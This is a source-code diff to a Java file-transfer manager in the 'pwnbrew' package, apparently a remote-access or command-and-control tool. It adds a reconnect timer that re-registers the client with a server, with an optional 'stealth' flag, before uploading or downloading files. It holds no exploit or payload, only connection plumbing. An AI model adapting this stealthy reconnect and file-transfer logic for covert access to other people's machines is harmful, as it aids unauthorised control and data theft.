@@ -36,13 +36,6 @@ The copyright on this package is held by Securifera, Inc
 
 */
 
-
-/*
- *  FileMessageManager.java
- *
- *  Created on Jun 2, 2013
- */
-
 package pwnbrew.network.file;
 
 import java.io.File;
@@ -63,10 +56,12 @@ import pwnbrew.log.LoggableException;
 import pwnbrew.log.RemoteLog;
 import pwnbrew.manager.ConnectionManager;
 import pwnbrew.manager.DataManager;
+import pwnbrew.manager.OutgoingConnectionManager;
 import pwnbrew.manager.PortManager;
 import pwnbrew.utilities.FileUtilities;
 import pwnbrew.network.ClientPortRouter;
 import pwnbrew.network.PortRouter;
+import pwnbrew.network.RegisterMessage;
 import pwnbrew.network.control.messages.ControlMessage;
 import pwnbrew.network.control.messages.DirCount;
 import pwnbrew.network.control.messages.FileSystemMsg;
@@ -75,6 +70,7 @@ import pwnbrew.network.control.messages.PushFileAck;
 import pwnbrew.network.control.messages.TaskGetFile;
 import pwnbrew.selector.SocketChannelHandler;
 import pwnbrew.utilities.DebugPrinter;
+import pwnbrew.utilities.ReconnectTimer;
 
 /**
  *
@@ -411,9 +407,24 @@ public class FileMessageManager extends DataManager {
                             DebugPrinter.printMessage(  this.getClass().getSimpleName(), "Calling connection function.");
                             setChannelId(0);
                             
+                            //Create the Timer
+                            OutgoingConnectionManager theOCM = aPR.getConnectionManager();
+                            int newChannelId = theOCM.getNextChannelId();
+                            ReconnectTimer aReconnectTimer = new ReconnectTimer(thePortManager, newChannelId); 
+                            byte stlth_val = 0;
+                            if( theConf.useStealth() )
+                                stlth_val = 1;   
+
+                            //Queue register message
+                            RegisterMessage aMsg = new RegisterMessage( RegisterMessage.REG, stlth_val, newChannelId);
+                            aReconnectTimer.setPostConnectMessage(aMsg);
+                            
                             //Start connection
-                            FileConnectionCallback aFCC = new FileConnectionCallback(thePortManager, serverIp, socketPort);
-                            aPR.ensureConnectivity( aFCC );
+                            FileConnectionCallback aFCC = new FileConnectionCallback(thePortManager, serverIp, socketPort, aReconnectTimer);
+                            //aPR.ensureConnectivity( aFCC );
+                            aReconnectTimer.setConnectionCallback(aFCC);
+                            aReconnectTimer.start();       
+                            
                             break;
                         case 0:
                             //Queue file download
@@ -455,9 +466,25 @@ public class FileMessageManager extends DataManager {
                     //Make sure to set channel Id before sending
                     queueFileUpload(pushFileMsg);
                     setChannelId(0);
+                    
+                    //Create the Timer
+                    OutgoingConnectionManager theOCM = aPR.getConnectionManager();
+                    int newChannelId = theOCM.getNextChannelId();
+                    ReconnectTimer aReconnectTimer = new ReconnectTimer(thePortManager, newChannelId); 
+                    byte stlth_val = 0;
+                    if( theConf.useStealth() )
+                        stlth_val = 1;   
+
+                    //Queue register message
+                    RegisterMessage aMsg = new RegisterMessage( RegisterMessage.REG, stlth_val, newChannelId);
+                    aReconnectTimer.setPostConnectMessage(aMsg);
+                    
                     //Start connection
-                    FileConnectionCallback aFCC = new FileConnectionCallback(thePortManager, serverIp, socketPort);
-                    aPR.ensureConnectivity( aFCC );
+                    FileConnectionCallback aFCC = new FileConnectionCallback(thePortManager, serverIp, socketPort, aReconnectTimer);
+                    //aPR.ensureConnectivity( aFCC );
+                    aReconnectTimer.setConnectionCallback(aFCC);
+                    aReconnectTimer.start();                    
+                    
                     break;
                 case 0:
                     //Queue file download
